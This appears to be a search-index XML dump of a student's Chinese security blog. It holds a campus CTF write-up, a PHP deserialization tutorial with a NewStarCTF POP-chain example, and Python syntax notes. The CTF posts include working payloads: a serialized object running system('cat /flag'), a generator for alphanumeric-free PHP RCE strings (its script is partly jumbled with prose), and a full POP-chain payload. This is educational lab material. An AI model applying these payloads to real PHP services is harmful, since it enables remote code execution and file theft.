<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>10月校赛wp</title>
      <link href="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/"/>
      <url>/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<p>由于本人热衷于web，致力于做一个好的web手，所以一般做题只做web，偶尔做一下misc，这次校赛本人真的菜，就做了一道，下次一定继续努力！故复现一下题目并整理一下wp，记录自己的成长之路并方便以后复习！</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="baby开胃菜"><a href="#baby开胃菜" class="headerlink" title="baby开胃菜"></a>baby开胃菜</h2><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/2.png"></p><p>我们直接查看F12源代码</p><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/3.png"></p><p>看到了一点提示，并且说了登录里藏了点东西，所以查看主界面右上角的登录</p><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/4.png"></p><p>看到是个后台登录界面，直接F12查看源代码大法</p><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/5.png"></p><p>所以试试账号，密码，此过程根据提示省略辣</p><p>当账号为admin123456时的回显</p><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/7.png"></p><p>当账号为admin1234567时的回显</p><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/8.png"></p><p>然后账号输入正确时，密码回显如下</p><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/9.png"></p><p>通过上面的a2.html里显示了密码的过滤方式</p><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/10.png"></p><p>所以直接双写绕过拿到flag！这也是本人作为菜鸡第一次月赛唯一会的一道题！好菜呜呜！</p><h2 id="babycve"><a href="#babycve" class="headerlink" title="babycve"></a>babycve</h2><p>进入界面如下</p><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/12.png"></p><p>根据题目，知道是cve漏洞，然后根据网站，搜索cve Grafana即可找到相关文章。</p><p>做题参考如下：<a href="https://blog.csdn.net/qq_36197704/article/details/123480175">Grafana任意文件读取漏洞（CVE-2021-43798）_chaojixiaojingang的博客-CSDN博客_grafana漏洞</a></p><h2 id="babyunser"><a href="#babyunser" class="headerlink" title="babyunser"></a>babyunser</h2><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/11.png"></p><p>如图所示，读题并一眼看出是PHP反序列化，但并没有看到哪里有输出flag（菜鸡）！一顿审计下来，发现run函数调用，指向了$a和$b</p><p>所以，参考大佬思路，这是个远程执行，system(‘whoami’) ,所以$this→a&#x3D;system,$this→b&#x3D;whoami(即获取flag的指令  ‘cat &#x2F;flag’)</p><p>在没有获取flag之前，应该先找到flag ‘find &#x2F; name flag’</p><p>构造如下poc，获取payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class cwm</span><br><span class="line">    &#123;</span><br><span class="line">        public $a=&#x27;system&#x27;;</span><br><span class="line">        public $b=&#x27;cat /flag&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">echo serialize(new cwm());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后令url&#x2F;?NEUQCSA&#x3D; O:3:”cwm”:2:{s:1:”a”;s:6:”system”;s:1:”b”;s:9:”cat &#x2F;flag”;}  即可获取flag</p><h2 id="babyrce"><a href="#babyrce" class="headerlink" title="babyrce"></a>babyrce</h2><p>最后一道也是我认为最难的一道，无字符rce，即正则匹配把字符，数字，字母，全过滤了</p><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/13.png"></p><p>难点就是绕过正则。参考大佬思路（呜呜，好菜，根本不会）。利用php的自增操作来绕过正则匹配</p><h4 id="步骤1-数组的-x3D-操作-，目的-拿到任意的字母"><a href="#步骤1-数组的-x3D-操作-，目的-拿到任意的字母" class="headerlink" title="步骤1:数组的 .&#x3D;操作 ，目的:拿到任意的字母"></a>步骤1:数组的 .&#x3D;操作 ，目的:拿到任意的字母</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$_ = [];</span><br><span class="line">$_ .= [];</span><br><span class="line">var_dump($_);</span><br><span class="line">#用$_是因为变量名只能由_,字母,数字组成,</span><br><span class="line">#这里的结果是 string(10) &quot;ArrayArray&quot;</span><br><span class="line">#因为 .= 是字符串的操作,而$_是数组,因此php编辑器将$_由数组转化为了字符串Array</span><br><span class="line">#有两个array是因为 .=的操作拼接了两个数组</span><br><span class="line">$__ = $_[0];</span><br><span class="line">#这里的$__也就是字符A</span><br><span class="line">$__++;</span><br><span class="line">#此时的$__就是字符B了</span><br><span class="line">#需要注意的是在php中A++ = B;但是 Z++=AA</span><br><span class="line">#这是因为php用了phar语言的特性,具体的可以去翻下phpAPI手册</span><br><span class="line">#如果是C语言的话倒是可以</span><br></pre></td></tr></table></figure><h4 id="步骤2-chr-函数的使用-目的：拿到任意字符"><a href="#步骤2-chr-函数的使用-目的：拿到任意字符" class="headerlink" title="步骤2:chr()函数的使用,目的：拿到任意字符"></a>步骤2:chr()函数的使用,目的：拿到任意字符</h4><p>由于步骤1我们能拿到任意字母,但拿不到任意字符,如 _ 导致我们构不成 $_POST 因此有了步骤二 </p><p>想要拿到任意字符也很简单,利用chr()函数即可</p><p> chr(int) -&gt; 返回int对应的ascii值,如 chr(97) -&gt; a;chr(65) -&gt;A </p><p>由于php是弱语言,CHR()和chr()是一样的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#先得到chr</span><br><span class="line">$_ = [];</span><br><span class="line">$_ .= [];</span><br><span class="line">$__ = $_[0]; #$__ = A</span><br><span class="line">$__++;$__++; #$__=C,得到了字符C</span><br><span class="line">#H和R也是一样的</span><br><span class="line">#如果 $__ = CHR的话, $__(97) 就是a了,利用这个机制就可以拿到任意的字符</span><br><span class="line">#在这里发现个问题,每次手动写太麻烦了,因此我写了个python脚本来辅助,代码如下</span><br><span class="line">#使用说明:给test传两个参数,</span><br><span class="line">#第一个是str类型的,也就是你要转换的字符串,</span><br><span class="line">#第二个是int类型的,用于控制变量名,如$_1,$_2,$_33,方便我们控制变量</span><br><span class="line">#test函数外面的那个print中的内容就是使 $_1 = CHR</span><br><span class="line">str=&#x27;ASSERT&#x27;</span><br><span class="line">利用脚本拿到转化后的字符串,如图</span><br><span class="line">对 _GET优化下使其变成 $_GET</span><br><span class="line">整合后的payload</span><br><span class="line">此时还不能直接用,因为+ 在url编码中会变成空格,导致了自增失败,因此我们拿去url编码下</span><br><span class="line">url编码地址:CTF在线工具-在线URL编码|URL解码 (hiencode.com)</span><br><span class="line">编码后的payload</span><br><span class="line">str2=&#x27;_GET&#x27;</span><br><span class="line">def test(str,j):</span><br><span class="line">flag=1</span><br><span class="line">for i in str:</span><br><span class="line">temp = ord(i)</span><br><span class="line">if flag==1:</span><br><span class="line">print(&quot;$_&#123;&#125;=$_1(&#123;&#125;);&quot;.format(j,temp),end=&#x27;&#x27;)</span><br><span class="line">flag=2</span><br><span class="line">else:</span><br><span class="line">print(&quot;$_&#123;&#125;.=$_1(&#123;&#125;);&quot;.format(j,temp),end=&#x27;&#x27;)</span><br><span class="line">print(&quot;$_=</span><br><span class="line">[];$_.=$_;$_=$_[0];$__=$_;$__++;$__++;$___=$__;$__=$_;$__++;$__++;$__++;$__++;$_</span><br><span class="line">_++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++</span><br><span class="line">;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$_1=$___;&quot;,end=</span><br><span class="line">&quot;&quot;)</span><br><span class="line">test(str,2)</span><br><span class="line">test(str2,3)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>反序列化问题总结</title>
      <link href="/2022/10/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>/2022/10/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><hr><h4 id="1-序列化：将变量（通常是数组和对象）转换为可保存或传输的字符串"><a href="#1-序列化：将变量（通常是数组和对象）转换为可保存或传输的字符串" class="headerlink" title="1 序列化：将变量（通常是数组和对象）转换为可保存或传输的字符串"></a>1 <strong>序列化</strong>：将变量（通常是数组和对象）转换为可保存或传输的字符串</h4><h4 id="2-反序列化：在适当的时候把这个字符串再转化成原来的变量（通常是数组和对象）使用。"><a href="#2-反序列化：在适当的时候把这个字符串再转化成原来的变量（通常是数组和对象）使用。" class="headerlink" title="2 反序列化：在适当的时候把这个字符串再转化成原来的变量（通常是数组和对象）使用。"></a><strong>2 反序列化</strong>：在适当的时候把这个字符串再转化成原来的变量（通常是数组和对象）使用。</h4><p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。反序列化本身不是漏洞，但如果反序列化的内容可控，就容易导致漏洞</p><h4 id="3-常用函数"><a href="#3-常用函数" class="headerlink" title="3 常用函数"></a>3 常用函数</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__construct()  <span class="comment">//当对象创建时触发</span></span><br><span class="line">__destruct()   <span class="comment">//当对象销毁时触发</span></span><br><span class="line">__wakeup()     <span class="comment">//当使用unserialize时触发</span></span><br><span class="line">__sleep()     <span class="comment">//当使用serialize时触发</span></span><br><span class="line">__destruct()  <span class="comment">//当对象被销毁时触发</span></span><br><span class="line">__call()      <span class="comment">//当对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get()       <span class="comment">//当访问不可访问或不存在的属性时触发</span></span><br><span class="line">__set()       <span class="comment">//当设置不可访问或不存在属性时触发</span></span><br><span class="line">__toString()  <span class="comment">//当把类当作字符串使用时触发  echo或者拼接字符串或者其他隐式调用该方法的操作都会触发</span></span><br><span class="line">__invoke()    <span class="comment">//当对象调用为函数时触发</span></span><br><span class="line">__callStatic  <span class="comment">//是调用类不存在的静态方式方法时执行</span></span><br><span class="line">__isset()     <span class="comment">//当对不可访问属性调用isset()或empty()时调用</span></span><br></pre></td></tr></table></figure><p>这是一个反序列化结果：  &#x2F;&#x2F;O:4:”Test”:2:{s:4:”test”;s:2:”ok”;s:3:”var”;N;}</p><p>O代表这是一个对象，4代表对象名称的长度，2代表成员个数。 “Test”代表类的名称<br>大括号中分别是：属性名类型、长度、名称;值类型、长度、值。“test”代表属性名称</p><p><img src="/2022/10/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/6.png"></p><p><strong>要点：</strong></p><p><strong>注意</strong>：反序列时需要注意私有的、被保护的属性被序列化的时候属性值会变成%00*%00属性名（受保护的）。</p><p>所以在构造a参数值的时候，注意序列化后的结构（可能%00类名%00属性名：私有的）</p><h4 id="4-Session序列化问题"><a href="#4-Session序列化问题" class="headerlink" title="4 Session序列化问题"></a>4 Session序列化问题</h4><h4 id="5-Phar反序列化问题"><a href="#5-Phar反序列化问题" class="headerlink" title="5 Phar反序列化问题"></a>5 Phar反序列化问题</h4><h4 id="6-POP链子类问题"><a href="#6-POP链子类问题" class="headerlink" title="6 POP链子类问题"></a>6 POP链子类问题</h4><p>以2022年9月的NewStarCTF week 2的Unseralize为例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上面所示，很明显就是一道php反序列化构造pop链的题，这类题首先我们需要做的就是观察我们的最终目的是要调用哪个函数，在此题中很明显有个关键语句： **echo file_get_contents(‘&#x2F;flag’);**所以我们最终目的便是要触发Sec类里的__invoke魔术方法即可获取flag。</p><p>pop链构造题中最常见的入口就是__destruct()，此函数在对象销毁时立刻触发（可以直接理解为new该对象时直接触发该方法），所以我们第一步便是创建一个变量实现Start类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br></pre></td></tr></table></figure><p>此时会触发__destruct()函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> 可以看到 echo 了 name 这个属性，所以此时若把name实例化成一个对象，且该对象含有__toString()时就可以触发该魔术方法，所以我们寻找含有该魔术方法的类即Sec类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lass Sec&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 跟进**__toString()<strong>，可以发现调用了</strong>obj<strong>的</strong>check()<strong>方法，而</strong>__call()<strong>刚好是调用一个对象中无法利用的方法或者不存在的方法时触发，</strong>Easy**类中就有这个魔术方法</p><p>所以我们把<strong>obj</strong>实例化为一个<strong>Easy</strong>类的对象 </p><p>因此第三步为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span>-&gt;name-&gt;obj = <span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br></pre></td></tr></table></figure><p>跟进**__call()<strong>，可以发现调用了</strong>clone<strong>，因此我们直接去找哪个类含有</strong>__clone()<strong>方法，可以发现</strong>eeee**类有此方法：</p><p>因此我们要把<strong>var</strong>这个变量实例化为一个<strong>eeee</strong>的对象</p><p>因此第四步为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span> = <span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>(); </span><br></pre></td></tr></table></figure><p> 跟进**__clone()<strong>，可以发现调用了</strong>isset()<strong>方法，因此我们直接找哪个类含有</strong>__isset()<strong>，可以发现</strong>Start<strong>类有此方法且</strong>Start<strong>类中无法调用</strong>cmd<strong>属性(因为不存在)，因此要把</strong>eeee<strong>对象中的obj属性实例化为一个</strong>Start**对象：</p><p> 因此第五步为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br></pre></td></tr></table></figure><p>跟进**__isset()<strong>，可以发现直接将</strong>func<strong>属性当成函数调用刚好可以触发</strong>__invoke()<strong>方法，所以此时就到了pop链的最后一个部分，现在只需要将</strong>func<strong>属性实例化为</strong>Sec**对象即可触发</p><p>因此最后一步为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res-&gt;name-&gt;var-&gt;obj-&gt;func = new Sec();</span><br></pre></td></tr></table></figure><p>直接将文中需要利用的类全部copy下来，<strong>注意！！！</strong>：因为私有类属性无法在类外进行操作，所以我们要把属性全部改成公有属性即 public属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Start&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $func;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Sec&#123;</span><br><span class="line">    public $obj;</span><br><span class="line">    public $var;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Easy&#123;</span><br><span class="line">    public $cla;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class eeee&#123;</span><br><span class="line">    public $obj;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">$res = new Start();</span><br><span class="line">$res-&gt;name = new Sec();</span><br><span class="line">$res-&gt;name-&gt;obj = new Easy();</span><br><span class="line">$res-&gt;name-&gt;var = new eeee(); </span><br><span class="line">$res-&gt;name-&gt;var-&gt;obj = new Start();</span><br><span class="line">$res-&gt;name-&gt;var-&gt;obj-&gt;func = new Sec();</span><br><span class="line">echo serialize($res);</span><br></pre></td></tr></table></figure><p>得到payload为：</p><p>  O:5:”Start”:2:{s:4:”name”;O:3:”Sec”:2:{s:3:”obj”;O:4:”Easy”:1:{s:3:”cla”;N;}s:3:”var”;O:4:”eeee”:1:{s:3:”obj”;O:5:”Start”:2:  {s:4:”name”;N;s:4:”func”;O:3:”Sec”:2:{s:3:”obj”;N;s:3:”var”;N;}}}}s:4:”func”;N;} </p><p>最后post传参，pop&#x3D;以上payload即可得到flag</p><h1 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h1><p>本人目前正在学习中</p><h1 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python语法速通</title>
      <link href="/2022/10/04/Python%E8%AF%AD%E6%B3%95%E9%80%9F%E9%80%9A/"/>
      <url>/2022/10/04/Python%E8%AF%AD%E6%B3%95%E9%80%9F%E9%80%9A/</url>
      
        <content type="html"><![CDATA[<h1 id="python语法"><a href="#python语法" class="headerlink" title="python语法"></a>python语法</h1><hr><ul><li>1 标识符： 只允许出现英文，中文（不推荐，可能会报错），数字(不可以开头)和下划线（_）。</li></ul><p><strong>注意：大小写敏感（区分），不可使用关键字</strong></p><ul><li>转移字符\可以接触引号的效用  例如： “\“黑马程序员\””       三引号用变量接收可以分多行写，不接收就是注释</li><li>字符串拼接： name&#x3D;&#x3D;”黑马程序员”  %d：占位整数  %f：占位小数</li></ul><p>​   massage&#x3D;“学IT: %s ” % name     &#x3D; 学IT： 黑马程序员    </p><p><strong>注意：多个变量占位需要在变量前后加括号</strong></p><hr><ul><li>字符串精度控制：   %7.2f   代表7位整数，2位小数     %5d   表示5位整数</li><li>字符串快速格式化：print（f“名称：{变量}，”）   f： format格式</li></ul><p>注意：不理会类型，不做精度控制（适合对精度无要求的使用）</p><hr><ul><li><strong>注意：无论输入什么，input（）的数据类型都是字符串型</strong></li></ul><hr><ul><li><p>if elif else 注意点： if elif 可以用多个，elif必须带条件，判断是互斥且有序的。 else不用带条件。</p></li><li><p>输出不换行  print（“hello”，end&#x3D;‘’） print （“world”，end&#x3D;‘’）即输出在同一行          print（）为换行</p></li></ul><hr><ul><li>for循环：无法定义循环条件      <strong>{for  临时变量   in   被处理的数据}</strong> 为语法格式   临时变量最好不要在for循坏外部使用</li><li>range语句  语法1：<strong>range （num）从0到num的值</strong>   为1个序列</li><li>语法2：      <strong>range（num1，num2）从1到2的值为1个序列</strong>   </li><li>语法3：      <strong>range（1，2，3）1到2每个按3的方式加  例如5 10 2    序列为{5，7，9}</strong></li></ul><hr><h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><p>def 函数名(传入参数):                 <strong>参数，返回值可以省略</strong>   省略时，可以返回return None</p><p>​  函数体“””  “””三引号可以在有参数的函数里写注释，自动补齐注释格式</p><p>​  return 返回值函数内部的变量不加 global 为局部变量</p><hr><h2 id="数据容器-2022-x2F-9-x2F-29"><a href="#数据容器-2022-x2F-9-x2F-29" class="headerlink" title="数据容器        2022&#x2F;9&#x2F;29"></a>数据容器        2022&#x2F;9&#x2F;29</h2><p>分为5类：列表，元组，字符串，集合，字典。         </p><p>append（元素）插入到结尾             insert（位置，“元素”)插入位置的前一位</p><h5 id="元组tuple-内容不可修改，里面嵌套的list列表可以修改-，语法和列表基本一致"><a href="#元组tuple-内容不可修改，里面嵌套的list列表可以修改-，语法和列表基本一致" class="headerlink" title="元组tuple  内容不可修改，里面嵌套的list列表可以修改 ，语法和列表基本一致"></a>元组tuple  